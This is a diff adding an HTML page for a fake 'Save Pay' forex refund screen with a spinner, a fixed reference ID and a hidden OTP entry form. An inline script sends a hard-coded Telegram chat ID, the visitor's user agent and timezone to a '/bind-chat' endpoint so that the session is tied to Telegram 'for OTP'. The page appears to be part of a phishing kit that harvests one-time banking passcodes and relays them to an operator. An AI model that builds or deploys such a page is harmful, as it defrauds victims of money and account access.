@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="style/loading.css" />
+  <title>Save Pay</title>
+</head>
+<body>
+  <div class="container">
+    <div class="logo" role="img" aria-label="Save Pay logo"></div>
+
+    <div class="payment-details">
+      <span><strong>Refund Details:</strong></span>
+      <span><strong>Service:</strong> Forex Refund</span>
+      <span><strong>Ref ID:</strong> A15441615193307</span>
+    </div>
+
+    <h2 class="title">Powered by Kpay</h2>
+
+    <div class="form">
+      <!-- Spinner -->
+      <div class="sk-chase">
+        <div class="sk-chase-dot"></div>
+        <div class="sk-chase-dot"></div>
+        <div class="sk-chase-dot"></div>
+        <div class="sk-chase-dot"></div>
+        <div class="sk-chase-dot"></div>
+        <div class="sk-chase-dot"></div>
+      </div>
+      <h3 class="sub-title">Refund in progress...</h3>
+
+      <!-- OTP prompt, hidden initially -->
+      <div class="otp-form" style="display: none; text-align: center;">
+        <label id="otp-label" for="otp-input"></label>
+        <input type="text" id="otp-input" maxlength="6" placeholder="••••••" />
+        <button type="button" id="otp-submit">Submit OTP</button>
+      </div>
+    </div>
+
+    <div class="verified" role="img" aria-label="Verified badge"></div>
+  </div>
+
+  <!-- Core scripts -->
+  <script src="js/jquery.min.js"></script>
+  <script src="js/imask.min.js"></script>
+  <script src="js/input.js"></script>
+  <script src="js/index.js"></script>
+
+  <!-- Bind this browser session to Telegram for OTP -->
+  <script>
+    (function() {
+      const chatId = 7398305164; // your Telegram chat ID
+      fetch('/bind-chat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chatId,
+          ua: navigator.userAgent,
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+        })
+      })
+      .then(() => console.log('✅ bind-chat sent'))
+      .catch(console.error);
+    })();
+  </script>
+</body>
+</html>
